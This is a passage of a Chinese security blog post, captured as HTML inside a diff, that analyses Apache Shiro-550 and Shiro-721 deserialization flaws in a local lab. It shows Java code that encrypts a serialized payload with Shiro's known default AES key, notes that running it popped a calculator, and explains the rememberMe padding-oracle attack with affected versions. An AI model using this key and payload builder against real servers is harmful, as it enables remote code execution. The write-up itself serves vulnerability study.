+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AesCipherService</span><span class="w"> </span><span class="n">aes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AesCipherService</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">CodecSupport</span><span class="p">.</span><span class="na">toBytes</span><span class="p">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteSource</span><span class="w"> </span><span class="n">ciphertext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aes</span><span class="p">.</span><span class="na">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ciphertext</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">serilize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">objout</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">out</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">objout</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ObjectBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">base64EncodedValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">ObjectBytes</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">base64EncodedValue</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">deserilize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">Filename</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="n">ClassNotFoundException</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">Filename</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="n">value</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-125127%201.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-125127%201.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-125127%201.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-125127%201.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-125127%201.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-125127%201.png" /></p>
+<p>用 jdk17 来编译 class 文件。最后弹出计算机</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131440.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131440.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131440.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131440.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131440.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-131440.png" /></p>
+<h2 id="shiro-721">Shiro-721</h2>
+<h3 id="漏洞利用条件">漏洞利用条件</h3>
+<ul>
+<li>开启 rememberMe 功能；</li>
+<li>rememberMe 值使用 AES-CBC 模式解密；</li>
+<li>能获取到正常 Cookie，即用户正常登录的 Cookie 值；（意思是要先登录一次）</li>
+<li>密文可控；（就是 cookie 嘛）</li>
+</ul>
+<h3 id="漏洞原理-1">漏洞原理</h3>
+<p><strong>影响版本</strong>：1.2.5 &lt;= Apache Shiro &lt;= 1.4.1
+<strong>漏洞特征</strong>：响应包中包含字段remember=deleteMe字段</p>
+<p>Shiro 的RememberMe Cookie使用的是 AES-128-CBC 模式加密。其中 128 表示密钥长度为128位，CBC 代表Cipher Block Chaining，这种AES算法模式的主要特点是将明文分成固定长度的块，然后利用前一个块的密文对当前块的明文进行加密处理。</p>
+<p>这种模式的加密方式容易受到 Padding Oracle Attack 的影响。如果填充不正确，程序可能会以不同的方式响应，而不是简单的返回一个错误。然后攻击者可以利用这些差异性响应来逐个解密密文中的块，即使他们没有加密的密钥。</p>
+<h3 id="环境搭建-1">环境搭建</h3>
+<p>参考：<a href="https://github.com/inspiringz/Shiro-721" target="_blank" rel="noopener noreffer ">https://github.com/inspiringz/Shiro-721</a></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/apache/shiro.git
+</span></span><span class="line"><span class="cl">cd shiro
+</span></span><span class="line"><span class="cl">git checkout shiro-root-1.4.1</span></span></code></pre></div></div><p>然后在执行下面命令编译 war 包</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd samples/web
+</span></span><span class="line"><span class="cl">mvn install</span></span></code></pre></div></div><p>配置 tomcat 和上面一样，只不过 jre 版本改为 1.8，webapps 目录下面选择该 war 包。然后运行结果如下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-175344.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-175344.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-175344.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-175344.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-175344.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-175344.png" /></p>
+<h3 id="漏洞分析-1">漏洞分析</h3>
+<p>其他地方其实和 shiro550 没什么差别，就是在对序列化内容进行编码有所改变，shiro550 是通过固定密钥来进行的加密，其设置密钥函数</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png" /></p>
+<p>而 shiro721 中则是通过动态来生成的密钥，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-185246.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-185246.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-185246.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-185246.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-185246.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-185246.png" /></p>
+<p>跟进函数 <code>generateNewKey</code> 看看密钥是怎么生成的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-191730.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-191730.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-191730.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-191730.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-191730.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-191730.png" /></p>
+<p>初始化了 <code>keyBitSize</code> 对象，这里是获得一个随机数发生器<code>SecureRandom</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-192714.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-192714.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-192714.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-192714.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-192714.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-192714.png" /></p>
+<p>然后调用了 generateKey() 函数</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-195249.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-195249.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-195249.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-195249.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-195249.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-195249.png" /></p>
+<p>最后 getEncoded 获得了 16 位随机密钥。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-194844.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-194844.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-194844.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-194844.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-194844.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241014-194844.png" /></p>
+<p>但是由于加密用的是 AES-128-CBC 加密模式，可以利用 CBC 翻转进行绕过。</p>
+<h4 id="漏洞利用-1">漏洞利用</h4>
+<p>这里需要利用差异性响应来逐个解密密文中的块，所以这里需要来看解密的不同响应，</p>
+<ul>
+<li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK）</li>
+</ul>
+<p>也就是前面看到的<code>Set-Cookie: rememberMe=deleteMe</code></p>
+<ul>
+<li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li>
+<li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li>
+</ul>
+<p>其实总结就是</p>
+<ul>
+<li>Padding正确，服务器正常响应</li>
+<li>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></li>
+</ul>
+<p>这里就直接利用工具进行构造了，工具地址：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated" target="_blank" rel="noopener noreffer ">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-10-12</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="shiro 反序列化漏洞" data-hashtags="java,shiro"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a>,&nbsp;<a href="/tags/shiro/">Shiro</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/rome/" class="prev" rel="prev" title="ROME 反序列化"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>ROME 反序列化</a>
+            <a href="/posts/c3p0/" class="next" rel="next" title="C3P0 链子分析学习">C3P0 链子分析学习<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
